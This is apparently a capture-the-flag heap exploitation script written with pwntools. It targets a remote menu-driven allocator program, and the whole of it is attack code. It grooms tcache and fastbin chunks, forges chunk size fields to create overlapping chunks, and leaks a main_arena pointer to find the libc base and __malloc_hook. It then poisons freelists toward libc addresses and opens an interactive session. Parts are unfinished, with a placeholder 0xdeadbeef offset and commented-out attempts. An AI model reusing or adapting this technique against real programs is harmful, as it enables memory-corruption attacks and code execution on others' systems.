from pwn import *

p = remote("192.168.0.13",1337)

def allocate(size):
   p.sendlineafter(': ','1')
   p.sendlineafter(': ',str(size))

def update(idx,size,data):
   p.sendlineafter(': ','2')
   p.sendlineafter(': ',str(idx))
   p.sendlineafter(': ',str(size))
   p.sendafter(': ',data)

def delete(idx):
   p.sendlineafter(': ','3')
   p.sendlineafter(': ',str(idx))



for i in range(8):
   allocate(88)
   update(i,88,((chr(0x41+i))*88))
allocate(88)
update(8,88,((chr(0x41+8))*88))
allocate(88)
update(9,88,((chr(0x41+9))*88))
i = 10
allocate(24)
update(i,24,((chr(0x41+i))*24)) #10
for i in range(11,15):
   allocate(88)
   update(i,88,((chr(0x61+i))*88))

allocate(88)
update(15,88,((chr(0x61+15))*88))
for i in range(0,10):
   delete(i)

for i in range(0,8):
   allocate(72)
   update(i,72,((chr(0x31+i))*72))

for i in range(0,8):
   delete(i)

for i in range(0,6):
   allocate(24)
   update(i,24,((chr(0x31+8))*24))


update(13,0x40,'n'*0x30+p64(0x100)+p64(0x81))
for i in range(11,14):
   delete(i)

allocate(24)

update(10,24,'a'*16+p64(0x130))
#star !!! 14 idx
allocate(40)
for i in range(4):
   allocate(40)
allocate(56)

for i in range(4):
   delete(i)

for i in range(4): #0x30 * 4
   allocate(40)

delete(4)
delete(5)
allocate(40)
#delete(14) #0x60
delete(15) #0x60
allocate(40)
update(0,16,p64(0x0)+p64(0x130))
#delete(8)
#down 10
#update(14,24,'a'*16+p64(0x0)) #idx 8 chunk size null
for i in range(0,8):
   delete(i)

delete(8)
allocate(56)
update(10,24,'a'*16+p64(0x0))
delete(14)
raw_input()
allocate(56)
p.sendlineafter(': ','4')
p.sendlineafter(': ','9')
p.recv(14)
p.recv(12)
main_arena = u64(p.recv(8)) - 96
libc = main_arena - 0x3ebc40
malloc_hook = main_arena-0x10
print hex(main_arena)
update(9,0xf,p64(0x80)+p64(0x100)[:-1])

for i in range(1):
  allocate(0x48) #0x6d0->size idx 12
delete(2)
update(9,0x18,p64(0x51)*0x2+p64(libc+0x3ebc6d))
allocate(0x48) #0x6d0->size idx 12
allocate(0x58)
delete(3)
allocate(0x48)
update(3, 0x23+8, "\x00"*0x23 + p64(libc+0x3ebc0d))
allocate(0x48) #0x6d0->size idx 12
raw_input('d')
allocate(0x20)
update(5,0x13+0x8,"\x41"*0x13+p64(libc+0xdeadbeef))
allocate(0x50)
'''
for i in range(6):
  allocate(0x30) #0x6d0->size idx 12

delete(2)
delete(3)
delete(4)
delete(5)
delete(6)
delete(7)
allocate(0x40)
allocate(0x40)
update(3,0x10,p64(0x1001)*2)
allocate(0x58)
'''
'''
delete(2)
update(9,0x18,"A"*0x10+p64(0xdeadbeef))
allocate(0x30) #0x6d0->size idx 12
allocate(0x30) #0x6d0->size idx 12
allocate(0x50)
#allocate(0x50)
#delete(9)
'''
'''
allocate(0x30) #3
payload = p64(0)+p64(0x61)
update(3,len(payload),payload)
allocate(88)
allocate(88)
#delete(12)
update(4,80,p64(0x61)*10)
update(3,24,p64(0)+p64(0x41)+p64(malloc_hook-0x23))
'''
p.interactive()
